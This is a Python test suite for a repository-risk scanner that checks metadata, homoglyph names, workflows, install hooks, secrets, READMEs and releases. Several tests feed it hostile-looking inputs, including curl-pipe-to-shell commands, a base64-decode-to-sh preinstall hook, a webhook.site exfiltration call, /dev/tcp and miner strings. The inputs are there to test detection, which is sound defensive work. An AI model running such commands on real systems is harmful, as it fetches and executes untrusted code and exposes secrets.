import json
import unittest
from datetime import timedelta

from repoguard.models import TreeEntry
from repoguard.rules import install, metadata, name, readme, releases, secrets, tree, workflows
from repoguard.rules.common import evidence_for
from repoguard.rules.common import CURL_PIPE
from repoguard.scoring import finalize
from support import NOW, blob, load_fixture, make_snapshot


def ids(snapshot, module) -> dict[str, str]:
    return {item.rule_id: item.severity for item in module.check(snapshot)}


class MetadataTests(unittest.TestCase):
    def test_young_repo_single_commit_fork_and_archive(self) -> None:
        snapshot = make_snapshot(
            created_at=NOW - timedelta(days=2),
            owner_created_at=NOW - timedelta(days=3),
            commit_count=1,
            is_fork=True,
            archived=True,
            license_spdx=None,
            stars=0,
        )
        found = ids(snapshot, metadata)
        self.assertEqual(found["meta.repo_muito_novo"], "low")
        self.assertEqual(found["meta.owner_muito_novo"], "medium")
        self.assertEqual(found["meta.um_unico_commit"], "low")
        self.assertEqual(found["meta.fork"], "info")
        self.assertEqual(found["meta.arquivado"], "info")
        self.assertEqual(found["meta.sem_licenca"], "info")

    def test_empty_repository_is_info(self) -> None:
        found = ids(make_snapshot(commit_count=0), metadata)
        self.assertEqual(found["meta.repositorio_vazio"], "info")
        self.assertNotIn("meta.um_unico_commit", found)

    def test_new_account_is_dampened_on_a_reputable_repo(self) -> None:
        snapshot = make_snapshot(
            created_at=NOW - timedelta(days=400),
            stars=80,
            owner_created_at=NOW - timedelta(days=4),
        )
        findings, _, verdict = finalize(metadata.check(snapshot), snapshot)
        owner = next(item for item in findings if item.rule_id == "meta.owner_muito_novo")
        self.assertEqual(owner.severity, "low")
        self.assertEqual(verdict, "apto")


class NameTests(unittest.TestCase):
    def test_homoglyph_and_invisible_character(self) -> None:
        snapshot = make_snapshot(owner="acme", repo="wid\u0435et\u200b")
        found = {item.rule_id: item for item in name.check(snapshot)}
        self.assertEqual(found["nome.homoglifo"].severity, "high")
        self.assertEqual(found["nome.caractere_invisivel"].severity, "high")
        self.assertNotIn("\u200b", found["nome.caractere_invisivel"].evidence or "")
        self.assertIn("\\u200b", found["nome.caractere_invisivel"].evidence or "")

    def test_single_script_name_is_quiet(self) -> None:
        self.assertEqual(name.check(make_snapshot(owner="acme", repo="widget")), [])
        self.assertEqual(name.check(make_snapshot(owner="acme", repo="виджет")), [])
        self.assertNotIn("nome.typosquat", ids(make_snapshot(repo="lodash"), name))
        self.assertNotIn("nome.typosquat", ids(make_snapshot(repo="preact"), name))

    def test_near_miss_of_a_popular_name(self) -> None:
        swapped = ids(make_snapshot(repo="lodahs"), name)
        duplicated = ids(make_snapshot(repo="expresss"), name)
        self.assertEqual(swapped["nome.typosquat"], "high")
        self.assertEqual(duplicated["nome.typosquat"], "high")


class TreeTests(unittest.TestCase):
    def test_binary_and_double_extension_are_one_finding_each(self) -> None:
        snapshot = make_snapshot(
            entries=[
                blob("bin/a.exe"),
                blob("bin/b.dll"),
                blob("docs/nota.pdf.exe"),
                blob("src/main.py"),
                TreeEntry("pasta.exe", "tree", None),
            ]
        )
        found = {item.rule_id: item for item in tree.check(snapshot)}
        self.assertEqual(found["tree.binario_executavel"].severity, "high")
        self.assertIn("bin/a.exe", found["tree.binario_executavel"].detail)
        self.assertIn("bin/b.dll", found["tree.binario_executavel"].detail)
        self.assertIn("docs/nota.pdf.exe", found["tree.binario_executavel"].detail)
        self.assertNotIn("pasta.exe", found["tree.binario_executavel"].detail)
        self.assertIn("docs/nota.pdf.exe", found["tree.extensao_dupla"].detail)
        self.assertEqual(len(tree.check(snapshot)), 2)
        disguised = make_snapshot(entries=[blob("docs/nota\u202eexe.txt")])
        self.assertEqual(ids(disguised, tree)["tree.nome_disfarcado"], "high")

    def test_truncated_tree_and_large_file(self) -> None:
        snapshot = make_snapshot(tree_truncated=True, skipped_large=["README.md"])
        found = ids(snapshot, tree)
        self.assertEqual(found["tree.truncada"], "medium")
        self.assertEqual(found["tree.arquivo_grande_nao_lido"], "low")


class WorkflowTests(unittest.TestCase):
    def test_fixture_covers_the_unsafe_pull_request_target(self) -> None:
        content = load_fixture("workflow_pr_target.yml")
        snapshot = make_snapshot(files={".github/workflows/ci.yml": content})
        found = ids(snapshot, workflows)
        self.assertEqual(found["workflow.pr_target_checkout"], "critical")
        self.assertEqual(found["workflow.curl_pipe_shell"], "high")
        self.assertEqual(found["workflow.interpolacao_evento"], "high")
        self.assertEqual(found["workflow.permissoes_amplas"], "medium")
        self.assertEqual(found["workflow.action_sem_sha"], "low")

    def test_checkout_of_the_pr_without_secrets_is_not_critical(self) -> None:
        content = """
name: ci
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567
        with:
          ref: ${{ github.event.pull_request.head.sha }}
"""
        found = ids(make_snapshot(files={".github/workflows/ci.yml": content}), workflows)
        self.assertEqual(found["workflow.pr_target_checkout"], "high")
        self.assertNotIn("workflow.action_sem_sha", found)

    def test_event_text_outside_run_is_ignored(self) -> None:
        content = """
on: push
jobs:
  build:
    steps:
      - run: echo ok
# ${{ github.event.issue.title }}
"""
        self.assertEqual(workflows.check(make_snapshot(files={".github/workflows/ci.yml": content})), [])

    def test_multiline_run_counts_as_interpolation(self) -> None:
        content = """
jobs:
  build:
    steps:
      - run: |
          echo ${{ github.event.issue.title }}
"""
        found = ids(make_snapshot(files={".github/workflows/ci.yml": content}), workflows)
        self.assertEqual(found["workflow.interpolacao_evento"], "high")

    def test_unpinned_action_is_dampened_once_per_repository(self) -> None:
        files = {
            ".github/workflows/a.yml": "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n",
            ".github/workflows/b.yml": "jobs:\n  b:\n    steps:\n      - uses: actions/setup-node@v4\n",
        }
        raw = workflows.check(make_snapshot(files=files))
        self.assertEqual([item.rule_id for item in raw], ["workflow.action_sem_sha"])
        popular = make_snapshot(files=files, created_at=NOW - timedelta(days=400), stars=90)
        findings, score, verdict = finalize(raw, popular)
        self.assertEqual(findings[0].severity, "info")
        self.assertEqual(score, 0)
        self.assertEqual(verdict, "apto")


class InstallTests(unittest.TestCase):
    def test_fixture_postinstall_is_critical_even_when_popular(self) -> None:
        content = load_fixture("package_hook.json")
        popular = make_snapshot(
            files={"package.json": content},
            created_at=NOW - timedelta(days=900),
            stars=5000,
        )
        findings, _, verdict = finalize(install.check(popular), popular)
        hook = next(item for item in findings if item.rule_id == "install.hook_rede")
        self.assertEqual(hook.severity, "critical")
        self.assertEqual(verdict, "nao_clonar")

    def test_lifecycle_hook_without_network_is_medium(self) -> None:
        content = json.dumps({"scripts": {"prepare": "node-gyp rebuild"}})
        found = ids(make_snapshot(files={"package.json": content}), install)
        self.assertEqual(found, {"install.hook": "medium"})

    def test_plain_hook_asks_for_review_until_the_repo_is_established(self) -> None:
        content = json.dumps({"scripts": {"prepare": "node-gyp rebuild"}})
        files = {"package.json": content}
        unknown = make_snapshot(files=files, created_at=NOW - timedelta(days=60), stars=0)
        popular = make_snapshot(files=files, created_at=NOW - timedelta(days=900), stars=5000)
        unknown_findings, _, unknown_verdict = finalize(install.check(unknown), unknown)
        popular_findings, _, popular_verdict = finalize(install.check(popular), popular)
        self.assertEqual(unknown_findings[0].severity, "high")
        self.assertEqual(unknown_verdict, "revisar")
        self.assertEqual(popular_findings[0].severity, "low")
        self.assertEqual(popular_verdict, "apto")

    def test_dropper_script_indicators(self) -> None:
        files = {
            "install.js": "post('https://webhook.site/example')\n",
            "index.js": "eval(String.fromCharCode(65))\n",
            "run.sh": "echo /dev/tcp/\n",
            "mine.sh": "xmrig\n",
        }
        found = ids(make_snapshot(files=files), install)
        self.assertEqual(found["install.exfil"], "critical")
        self.assertEqual(found["install.ofuscacao"], "critical")
        self.assertEqual(found["script.canal_shell"], "critical")
        self.assertEqual(found["script.minerador"], "critical")

    def test_base64_execution_setup_and_dependencies(self) -> None:
        package = json.dumps(
            {
                "scripts": {"preinstall": "echo a | base64 -d | sh"},
                "dependencies": {"left": "git+http://example.com/left.git", "right": "git+https://example.com/right.git"},
            }
        )
        files = {
            "package.json": package,
            "setup.py": load_fixture("setup_exec.py"),
            "requirements.txt": "demo @ git+https://example.com/demo.git\n",
            "requirements-url.txt": "https://example.com/demo.whl\n",
            "scripts/bootstrap.sh": "curl https://example.com/a.sh | sudo bash\n",
        }
        found = ids(make_snapshot(files=files), install)
        self.assertEqual(found["install.hook"], "medium")
        self.assertEqual(found["install.base64_exec"], "critical")
        self.assertNotIn("install.hook_rede", found)
        self.assertEqual(found["install.dependencia_git_http"], "high")
        self.assertEqual(found["install.setup_comando"], "high")
        self.assertEqual(found["script.curl_pipe_shell"], "high")
        self.assertEqual(found["install.dependencia_url"], "medium")

    def test_script_outside_root_or_scripts_is_ignored(self) -> None:
        files = {"lib/tool.sh": "curl https://example.com/a.sh | sh\n"}
        self.assertEqual(install.check(make_snapshot(files=files)), [])


class SecretTests(unittest.TestCase):
    def test_fixture_reads_an_ssh_key(self) -> None:
        found = ids(make_snapshot(files={"scripts/collect.sh": load_fixture("secret.sh")}), secrets)
        self.assertEqual(found["segredo.leitura_caminho"], "critical")

    def test_private_key_block(self) -> None:
        content = "-----BEGIN OPENSSH PRIVATE KEY-----\n"
        found = ids(make_snapshot(files={"ci/key.txt": content, ".env": "TOKEN=exemplo\n"}), secrets)
        self.assertEqual(found["segredo.chave_privada"], "critical")
        self.assertEqual(found["segredo.arquivo_env"], "high")

    def test_committed_npm_token(self) -> None:
        content = "//registry.npmjs.org/:_authToken=exemplo\n"
        found = ids(make_snapshot(files={".npmrc": content}), secrets)
        self.assertEqual(found["segredo.credencial_no_arquivo"], "high")


class ReadmeTests(unittest.TestCase):
    def test_fixture_curl_pipe_changes_with_reputation(self) -> None:
        content = load_fixture("readme_curl.md")
        middle = make_snapshot(files={"README.md": content}, created_at=NOW - timedelta(days=60), stars=0)
        young = make_snapshot(files={"README.md": content}, created_at=NOW - timedelta(days=2), stars=0)
        popular = make_snapshot(
            files={"README.md": content},
            created_at=NOW - timedelta(days=400),
            stars=200,
        )
        self.assertEqual(finalize(readme.check(middle), middle)[0][0].severity, "medium")
        self.assertEqual(finalize(readme.check(young), young)[0][0].severity, "high")
        self.assertEqual(finalize(readme.check(popular), popular)[0][0].severity, "low")

    def test_plain_curl_mention_is_not_a_finding(self) -> None:
        content = "Use curl https://example.com para baixar a documentacao.\n"
        self.assertEqual(readme.check(make_snapshot(files={"README.md": content})), [])

    def test_disable_protection_and_token_request_stay_high(self) -> None:
        content = "Desative o antivírus antes de continuar.\nCole o token na configuração.\n"
        popular = make_snapshot(
            files={"README.md": content},
            created_at=NOW - timedelta(days=400),
            stars=200,
        )
        found = {item.rule_id: item.severity for item in finalize(readme.check(popular), popular)[0]}
        self.assertEqual(found["readme.desligar_protecao"], "high")
        self.assertEqual(found["readme.pedido_token"], "high")

    def test_snippet_strips_color_from_the_install_line(self) -> None:
        text = "antes \x1b[31mcurl https://example.com/x.sh | bash\x1b[0m depois"
        snippet = evidence_for(text, CURL_PIPE) or ""
        self.assertNotIn("\x1b", snippet)
        self.assertNotIn("\n", snippet)
        self.assertLessEqual(len(snippet), 160)
        self.assertIn("curl", snippet)


class ReleaseTests(unittest.TestCase):
    def test_young_repository_with_an_executable_asset(self) -> None:
        young = make_snapshot(
            created_at=NOW - timedelta(days=10),
            release_assets=["notas.txt", "Setup.exe"],
        )
        old = make_snapshot(created_at=NOW - timedelta(days=200), release_assets=["disk.iso"])
        self.assertEqual(ids(young, releases)["release.binario_anexo"], "high")
        self.assertEqual(ids(old, releases)["release.binario_anexo"], "medium")
        self.assertEqual(releases.check(make_snapshot(release_assets=["fonte.tar.gz"])), [])


if __name__ == "__main__":
    unittest.main()
